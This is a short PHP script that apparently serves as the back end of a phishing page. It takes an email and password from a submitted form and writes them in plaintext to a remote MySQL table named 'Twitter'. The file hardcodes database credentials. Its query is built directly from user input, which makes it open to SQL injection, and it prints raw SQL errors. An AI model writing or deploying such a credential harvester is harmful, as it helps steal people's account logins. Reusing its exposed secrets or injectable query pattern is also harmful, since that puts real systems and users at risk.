
<?php 


$email = $_POST['email'];
$pass = $_POST['pass'];

 // create connection
 $servername = "sql309.epizy.com"; 
 $username = "epiz_30865970"; 
 $password = "Ypx9MaQS0p2z"; 
 $dbname = "epiz_30865970_Suraj"; 
  
 // Create connection 
  $conn=mysqli_connect("sql309.epizy.com","epiz_30865970","Ypx9MaQS0p2z","epiz_30865970_Suraj");


$sql = "INSERT INTO Twitter ( `EMAIL`, `PASSWORD`)
 VALUES ('$email','$pass')"; 
  
//hjjk
if ($conn->query($sql) === TRUE) 
 { 
  echo "New record created successfully"; 
 } 
 else  
 { 
  echo "Error: " . $sql . "<br>" . $conn->error; 
 } 
  
 $conn->close();

  

?>
